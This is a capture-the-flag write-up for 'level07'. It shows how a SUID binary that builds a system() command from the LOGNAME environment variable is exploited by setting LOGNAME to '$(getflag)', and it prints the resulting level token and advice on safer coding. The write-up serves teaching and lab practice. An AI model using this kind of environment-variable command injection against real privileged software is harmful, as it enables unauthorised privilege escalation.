# level07

## Goal

Exploit a SUID binary that uses a user-controlled environment variable to execute arbitrary commands with the privileges of the `flag07` user.

## Enumeration

Inspect the binary:

```bash
file level07
nm level07
```

Interesting imported functions:

```text
getenv()
asprintf()
system()
```

The combination of these functions suggests that the program:

1. reads an environment variable;
2. builds a command string;
3. executes it through the system shell.

## Analysis

`getenv()` returns the value of an environment variable controlled by the user.

The binary uses the `LOGNAME` variable to build a command executed by `system()`.

Because `system()` invokes a shell, shell expansions are interpreted before execution.

This creates a **Command Injection** vulnerability through an environment variable.

## Exploitation

Set a malicious value for `LOGNAME`:

```bash
export LOGNAME='$(getflag)'
```

Execute the SUID binary:

```bash
./level07
```

The shell expands:

```bash
$(getflag)
```

before executing the command, causing `getflag` to run with the privileges of the `flag07` user.

## Validation

Output:

```text
Check flag.Here is your token :
fiumuikeil55xe9cu4dood66h
```

The returned token is the password for `level08`.

## Concept

Execution flow:

```text
LOGNAME (user controlled)
        ↓
getenv("LOGNAME")
        ↓
asprintf(...)
        ↓
system(...)
        ↓
Shell expansion
        ↓
$(getflag)
        ↓
Command executed as flag07
```

## Security Impact

Privileged programs should never construct shell commands from user-controlled environment variables.

Safer alternatives include:

* avoiding `system()`;
* using `execve()` with fixed arguments;
* validating or sanitizing environment variables before use.

## Resources

Useful commands:

```bash
file level07
nm level07
ltrace ./level07

export LOGNAME='$(getflag)'
./level07
```
